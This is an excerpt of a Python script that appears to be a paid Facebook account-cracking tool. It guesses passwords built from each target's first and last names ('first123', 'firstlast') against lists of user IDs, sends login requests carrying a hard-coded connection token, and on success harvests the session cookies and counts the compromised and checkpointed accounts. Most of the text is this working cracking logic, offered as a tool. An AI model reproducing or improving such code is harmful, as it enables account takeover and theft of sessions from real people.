...
os.system('clear')
print('\033[1;32mloading Modules ...\n')
...
\033[1;37m------------------------------------------------
\033[1;36m Owner   :     RISHAV HERO
\033[1;35m Facebook:     ALIVE XWD
\033[1;33m Github  :     ALIVE-HERO444
\033[1;32m Version :     V.14.0
\033[1;31m Tool Type :   PAID 
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def method_crack():
    global methods
    clear()
    print(f'/\033[1;32m[1] Method {1}[Cookies Show]')
    print(f'\033[1;32m[2] Method {2}[Only Id Pass & User]')
    #print(f'[3] Method {3}')
    #print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\033[1;32m\r {S}[ALIVE] {loop} | M•1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ALIVEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ALIVEb};{ckkk}"
                    print(f"\033[1;32m\r{R} [ALIVE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\033[1;32m\r {S}[ALIVE] {loop} | M•2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            pw = []
            clear()
            print('\033[1;32mPut limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [\033[1;32mExample: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
            ...
            print(47*"-")
            print(f'{S}\033[1;32mTotal IDs : %s ' % len(self.id))
            print(f'{S}\033[1;32mCracking Started...')
            print(47*"-")
